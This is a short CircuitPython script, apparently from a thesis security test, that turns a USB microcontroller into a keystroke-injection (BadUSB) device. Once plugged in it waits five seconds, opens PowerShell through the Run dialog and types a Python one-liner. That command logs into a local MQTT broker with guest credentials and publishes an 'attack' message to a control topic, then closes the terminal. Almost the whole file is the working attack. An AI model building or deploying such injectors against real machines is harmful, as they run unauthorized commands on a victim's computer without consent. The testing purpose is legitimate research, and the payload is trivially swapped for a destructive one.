import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(5) 

# --- FINAL PAYLOAD (WITH YOUR TIMINGS) ---

# 1. Open PowerShell
kbd.press(Keycode.GUI, Keycode.R) 
kbd.release_all()
time.sleep(2)
layout.write('powershell\n') 
time.sleep(5)

# 2. Run the Python command with GUEST credentials
#    (Unauthorized Write: Attack SHOULD fail silently)
layout.write('python -c "import time, paho.mqtt.client as mqtt; client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1); client.username_pw_set(\'guest\', \'guest123\'); client.connect(\'192.168.0.100\', 1883, 60); client.publish(\'thant-thesis-test/control\', \'PICO ATTACK!\'); time.sleep(1); client.disconnect()"\n')
time.sleep(5)

# 3. Close the terminal
layout.write('exit\n')

# --- END PAYLOAD ---